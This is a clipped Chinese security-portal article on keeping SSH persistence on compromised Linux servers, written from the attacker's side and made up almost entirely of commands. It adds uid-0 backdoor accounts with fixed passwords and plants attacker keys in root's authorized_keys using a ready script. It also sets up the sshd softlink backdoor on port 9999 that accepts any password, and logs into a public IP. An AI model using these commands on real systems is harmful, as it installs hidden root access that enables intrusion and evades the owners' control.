---
title: 权限维持小记 - ssh - FreeBuf 网络安全行业门户
url: https://www.freebuf.com/defense/382376.html
clipped_at: 2024-03-29 09:56:43
category: default
tags: 
 - www.freebuf.com
---


# 权限维持小记 - ssh - FreeBuf 网络安全行业门户

## 防火墙规则

#### ubuntu/debain

```plain
iptables -L
```

如果你想通过 iptables 添加规则允许任何 IP 连接 SSH，你可以使用以下命令。这里假设你使用的是默认的 SSH 端口 22。

```plain
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

```
iptables -A INPUT -p tcp --dport 10086 -j ACCEPT
```



这个命令添加一个规则，允许 TCP 流量通过到达目标端口 22（SSH 端口）。`-A INPUT` 意味着将规则添加到输入链（incoming chain）。

然后，你需要保存 iptables 规则以确保它们在系统重新启动时保持。你可以使用以下命令：

```plain
sudo service iptables save
sudo service iptables restart
```

或者，如果你使用的是 `ufw`（Ubuntu 的简化防火墙管理工具），你可以使用以下命令：

```plain
sudo ufw allow 22
```

这将允许 SSH 流量通过 ufw，然后你可以使用 `sudo ufw enable` 保存并激活规则。

请注意，开放所有 IP 访问 SSH 可能存在安全风险。最好限制允许连接的 IP 范围，以提高安全性。如果服务器直接暴露在公共网络上，强烈建议使用密钥进行身份验证，而不是仅仅依赖密码。

#### Centos

启动： 

```
systemctl start firewalld
```



查看状态： 

```
systemctl status firewalld
```



禁用，禁止开机启动： 

```
systemctl disable firewalld
```



停止运行： 

```
systemctl stop firewalld
```

```
firewall-cmd --list-port // 查看防火墙已经开放的端口

firewall-cmd --reload firewall-cmd --list-port // 查看防火墙已经开放的端口
```





**删除：**

```
firewall-cmd --zone=public --remove-port=80/tcp --permanent
```



**增加**

```
firewall-cmd --zone=public --add-port=5/tcp --permanent
```



## 0x00 后门账户

方法 1   添加账号 redi1s，设置 uid 为 0，密码为 123456

```plain
useradd -p `openssl passwd -1 -salt 'salt' 123456` redi1s -o -u 0 -g root -G root -s /bin/bash -d /home/test1
```

```plain
ssh redi1s@IP
```

方法 2

```plain
echo "test2:x:0:0::/:/bin/sh" >> /etc/passwd #增加超级用户账号
passwd test2 #修改test2的密码为123456
```

```plain
echo "redis:x:0:1001:::/bin/bash" | sudo teehee -a /etc/passwd
```

## 0x01 公私钥

### 防火墙导入配置

ubuntu/debain

```plain
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

centos

```plain
firewall-cmd --zone=public --add-port=22/tcp --permanent
```

### ssh 服务是否启动

```plain
ps -e| grep ssh
```

启动 SSH 服务的命令取决于操作系统。以下是一些不同操作系统上启动 SSH 服务的命令：

Linux

1.  **Systemd 系统（例如 Ubuntu 16.04+，CentOS 7+）:**
    
    ```plain
    sudo systemctl start ssh
    ```
    
2.  **SysV Init 系统（例如 Ubuntu 14.04，CentOS 6）:**
    
    ```plain
    sudo service ssh start
    ```
    

macOS

```plain
sudo systemsetup -setremotelogin on
```

ssh 登录时会先检查公钥，公钥位置在～/.ssh/authorized\_keys

### 直接启动 SSH 守护进程

在某些系统上，你可能需要直接启动 SSH 守护进程，而不使用服务管理工具。SSH 守护进程的二进制文件通常是 `sshd`。你可以使用以下命令：

```plain
/usr/sbin/sshd
```

**如果想要 利用公私钥登录而无需输入密码，需要更改如下配置**

### 配置

文件目录在 /etc/ssh

`ssh\_config`

```plain
PasswordAuthentication yes
```

`sshd\_config`

```plain
RSAAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
```

攻击机生成 存放在`~/.ssh`

```plain
ssh-keygen -t rsa          #三次回车
id_rsa : 私钥
id_rsa.pub : 公钥
```

上传公钥至目标主机即可


路径  `/root/.ssh/authorized_keys`

```plain
ssh-keygen -t rsa
cd /root/.ssh
touch authorized_keys
cat id_rsa.pub >> authorized_keys 
```

或者导入本机的公钥

```plain
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIiRWbvrujmlEO1QNPXDeNejtuihzyNzqj+kAVIrE4RrEznN/9gmdkeCQ9Iw7Lp247PhHaoG770SmsFv/NKNlsgT/hYvSbHVVkX6lxsGlIjtbOTCxvuOIH7UmjVYxyGjeQBKjUZId3/XdWlUhMhEYkCX9pZPGZfyBhrJqcz/gdTyQkcMNJTk+pfOUlZ5M8WwGCp0+e0Kw3ybPGT0NPAdFrApRoLhRJy8EVVy+eQ6VkShZWljI5+6wZNZ6kxjSS/krE2dnESLYmgrgB2/tMjIOTjvljCSgau+zIsoAcGJzGjKTWNrHJiboMtdnW3AxUKjOGJitjc/9GjhL96d9GNjaL 
```

如果遇到 密钥不匹配问题

```plain
ssh -i id_rsa -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss root@IP
```

### 脚本

```plain
#!/bin/bash

# 添加防火墙规则允许SSH流量
iptables -A INPUT -p tcp --dport 22 -j ACCEPT || true

# CentOS防火墙规则（永久生效）
firewall-cmd --zone=public --add-port=22/tcp --permanent || true
firewall-cmd --reload || true

# 启动SSH服务
/usr/sbin/sshd || true

# 配置SSH服务器
echo "RSAAuthentication yes" >> /etc/ssh/sshd_config || true
echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config || true
echo "AuthorizedKeysFile .ssh/authorized_keys" >> /etc/ssh/sshd_config || true

# 生成SSH密钥对（自动回车）
yes "" | ssh-keygen -t rsa || true
​
# 创建.ssh目录（如果不存在）
mkdir -p /root/.ssh || true

# 在.ssh目录中创建并编辑authorized_keys文件，添加公钥
touch /root/.ssh/authorized_keys || true
cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys || true   #这里可以导入本机的密钥

# 打印生成的id_rsa文件内容
echo "生成的 id_rsa 文件内容："
cat ~/.ssh/id_rsa || true

echo "配置完成."
```

  

```plain
ssh -i id_rsa user@192.168.6.152
```

## 0x02 SSH 软链接

3.1.1. 查看是否开启 pam 身份验证

这里如果是 no 可以去这个配置文件中直接去修改，不过需要是 root 权限哦。

```plain
cat /etc/ssh/sshd_config|grep UsePAM
```

3.1.2. 建立软连接

这里建立软连接后，需要将防火墙的端口开放，如果防火墙是关闭的就无所谓了。

```plain
ln -sf /usr/sbin/sshd /tmp/su ;/tmp/su -oPort=9999
#开启软链接，链接端口为9999

firewall-cmd --add-port=9999/tcp --permanent
#开启防火墙规则，不然会连接不上

firewall-cmd --reload
#重启防火墙服务

firewall-cmd --query-port=9999/tcp
#查看防火墙9999端口是否被放行，回显为YES即成功放行

iptables -A INPUT -p tcp --dport 9999 -j ACCEPT

```

3.1.3. 测试

这里后面的 9999 是端口，进去随便输入一些密码就可以登录进去了。

```plain
##-p 后面这个是端口
ssh root@183.214.5.153  -p 9999
```
